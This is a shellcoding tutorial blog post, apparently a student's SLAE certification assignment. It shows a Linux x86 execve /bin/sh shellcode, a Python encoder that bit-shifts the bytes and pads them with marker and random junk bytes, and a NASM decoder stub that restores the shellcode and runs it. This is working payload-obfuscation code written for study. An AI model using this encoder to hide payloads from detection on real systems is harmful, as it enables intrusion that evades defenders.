---
layout: single
title: SLAE Assignment 4 -- Encoder
date: 2019-5-11
classes: wide
header:
  teaser: /assets/images/SLAE/SLAE.jpg
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
--- 
![](/assets/images/SLAE/SLAE.jpg)

## Introduction

Assignment 4 is create a custom encoder and decoder for some shellcode. For this excercise, I stuck with a simple `execve` shellcode which will execute `/bin/sh`:
```terminal_session
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

## Encoder Fundamentals

We need to encode the aforementioned shellcode and an easy way to accomplish this is with a higher level language such as python. I haven't really done much python with bytearrays so let's see how it works step by step.

### Working with Python

The first thing we want to do is introduce our pristine shellcode to our python script (note that we are using python3 for this).

```python
execve = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
```

According to this [stackoverflow entry](https://stackoverflow.com/questions/2592764/what-does-a-b-prefix-before-a-python-string-mean), the lower-case `b` in our variable definition makes the string that follows a bytes string literal. What does this mean? Basically, the expression establishes a `byte object` instead of a `Unicode str object` like we're accustomed to. So even though this entity has all of the superficial features or a regular string, it's actually a bytes object. Let's do some comparisons so that we can solidify this difference in our minds.

```python
byteObject = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
strObject = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

print("The byteObject is " + str(len(byteObject)) + " long.")
print("The strObject is " + str(len(strObject)) + " long.")
```

If we run this code, we get the following output:

```terminal_session
root@kali:~# python3 encoder.py
The byteObject is 25 long.
The strObject is 25 long.
```

So they are the same length. Let's iterate a print command over them and see if we notice a difference. 

```python
byteObject = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
strObject = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

for x in byteObject:
	print(x)
```

Running this prints out our hex encoded segments as their decimal companions! This should make them very easy to work with.

```terminal_session
root@kali:~# python3 encoder.py
49
192
80
104
47
47
115
104
104
47
98
105
110
137
227
80
137
226
83
137
225
176
11
205
128
```

Let's do the same thing for our standard Unicode str object and see what the output is. 

```terminal_session
root@kali:~# python3 encoder.py
1
À
P
h
/
/
s
h
h
/
b
i
n

ã
P

â
S

á
°


Í

```

As you can see (or not!), it's printing our hex encoded segments as their Unicode counterparts, we can't work with this. Hopefully now we have a better grasp on how python is handling our `byte object`.

### Bitwise Operators

According to [tutorialspoint,](https://www.tutorialspoint.com/python/bitwise_operators_example.htm) we can use the following bitwise operators in python:

| Operator                 | Description                                                                                  |
|--------------------------|----------------------------------------------------------------------------------------------|
| & Binary AND             | Operator copies a bit to the result if it exists in both operands.                           |
| \| Binary OR              | It copies a bit if it exists in either operand.                                              |
| ^ Binary XOR             | It copies the bit if it is set in one operand but not both.                                  |
| ~ Binary Ones Complement | It is unary and has the effect of 'flipping' bits.                                           |
| << Binary Left Shift     | The left operands value is moved left by the number of bits specified by the right operand.  |
| >> Binary Right Shift    | The left operands value is moved right by the number of bits specified by the right operand. |

A bitwise operation is when you convert your two operands into their binary representation and then starting from the right (least significant bit) begin to do a logical operation between each binary digit. 

For example, take the operands 12 and 10 and then perform a bitwise `AND` on them to get 8:

`1100` **AND** `1010` = `1000` 

Starting on each number's right and moving left:

`0` **AND** `0` = `0`

`0` **AND** `1` = `0`

`1` **AND** `0` = `0`

`1` **AND** `1` = `1`

For more practice, play with this [calculator](https://www.rapidtables.com/calc/math/binary-calculator.html). 

At this point we know fundamentally how python is working and what a bitwise logical operation entails. We can research the other operators and figure out how they do their operations. Now we can begin encoding our shellcode. 

## Encoder

For our encoder, let's keep things relatively simple. Our encoding process will do the following:
+ if the decimal equivalent of our hex segment is less than `128`, we will shift its bits to the left one slot. As you can probably figure out, if we were to do this with a value of `128` or higher, shifting its bits to the left even one spot would increase its value to a minimum of `256` which breaks our scheme. 
+ lastly, we will inject some random bytes into our code at a known interval so that we can later delete those same bytes since the interval is known. In simpler terms: if I know every other byte is fake, I'll make my decoder delete every other byte. 

### Step 1 -- Bit Shift

In order to mark which bytes we are shifting we will append a `0xff` to them so that later when we decode, we know which ones were shifted. 

```python
byteObject = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encode = ""

for x in bytearray(byteObject):
	if x < 128:
		x = x << 1
		encode += '\\xff'

	encode += "\\x"
	encode += '%02x'%x
		

print(encode)
```

Output

```terminal_session
root@kali:~# python3 encoder.py
\xff\x62\xc0\xff\xa0\xff\xd0\xff\x5e\xff\x5e\xff\xe6\xff\xd0\xff\xd0\xff\x5e\xff\xc4\xff\xd2\xff\xdc\x89\xe3\xff\xa0\x89\xe2\xff\xa6\x89\xe1\xb0\xff\x16\xcd\x80
```

Looks like we ended up with 14 of the bytes shifted. That's pretty cool!

### Step 2 -- Random Byte Injection

Now we import the `random` module and use it to inject a random byte during each iteration of the loop. In other words, our encoder will now shift bytes lower than `128`, prepend those bytes with `0xff`, and then finally append that byte with a random byte. So in practice we can have the following pseudo bytes sequences:
+ Unshifted + Random
+ 0xff + Shifted + Random

Lastly, we'll want to print to terminal our shellcode formatted in a way that we can use it in our assembly, annotated here as the 'For NASM:' output.

```python
import random

byteObject = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encode = ""


for x in bytearray(byteObject):
	if x < 128:
		x = x << 1
		encode += '\\xff'

	encode += "\\x"
	encode += '%02x'% x
	sneaky = random.randint(2,253)
	encode += '\\x%02x' % sneaky

		

db = str(encode).replace("\\x", ",0x")
db = db[1:]
print('For NASM: ' + db)
```

Running this gives us the following output:

```terminal_session
root@kali:~# python3 encoder.py
For NASM: 0xff,0x62,0x0f,0xc0,0xde,0xff,0xa0,0x5a,0xff,0xd0,0x1b,0xff,0x5e,0x09,0xff,0x5e,0xed,0xff,0xe6,0x09,0xff,0xd0,0x93,0xff,0xd0,0x30,0xff,0x5e,0xc8,0xff,0xc4,0x26,0xff,0xd2,0x3e,0xff,0xdc,0xa3,0x89,0x14,0xe3,0x9a,0xff,0xa0,0x47,0x89,0xe0,0xe2,0xa2,0xff,0xa6,0xa5,0x89,0x8b,0xe1,0x9e,0xb0,0x67,0xff,0x16,0x8c,0xcd,0xb2,0x80,0x30
```

## Decoder

I'm not going to lie, figuring out how to decode this took me an entire day. First let's add an `0xaa` to the end of our shellcode so that we can add some control flow to our assembly and have it run the shell-code once we do a `CMP` operation with our current iteration. If we compare our current iteration with `0xaa` and the result is zero, then we know we're done decoding and we can run the shell-code.

Let's jump right into the assembly!

```nasm
global _start


section .text

_start:

	jmp short call_decoder	
	

decoder:
	pop esi
	lea edi, [esi]
	xor eax, eax
	xor ebx, ebx
	

sniffer:
	mov bl, byte [esi + eax]
	cmp bl, 0xaa
	jz shellcode
	mov bl, byte [esi + eax]
	cmp bl, 0xff
	jz shifter
	mov bl, byte [esi + eax]
	mov byte [edi], bl
	inc edi
	add al, 2
	jmp short sniffer
	
	
shifter:
	mov bl, byte [esi + eax + 1]
	shr bl, 1
	mov byte [edi], bl
	inc edi
	add al, 3
	jmp short sniffer
	
call_decoder:

	call decoder
	shellcode: db 0xff,0x62,0x0f,0xc0,0xde,0xff,0xa0,0x5a,0xff,0xd0,0x1b,0xff,0x5e,0x09,0xff,0x5e,0xed,0xff,0xe6,0x09,0xff,0xd0,0x93,0xff,0xd0,0x30,0xff,0x5e,0xc8,0xff,0xc4,0x26,0xff,0xd2,0x3e,0xff,0xdc,0xa3,0x89,0x14,0xe3,0x9a,0xff,0xa0,0x47,0x89,0xe0,0xe2,0xa2,0xff,0xa6,0xa5,0x89,0x8b,0xe1,0x9e,0xb0,0x67,0xff,0x16,0x8c,0xcd,0xb2,0x80,0x30,0xaa
```


## Github

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1458

You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment3)





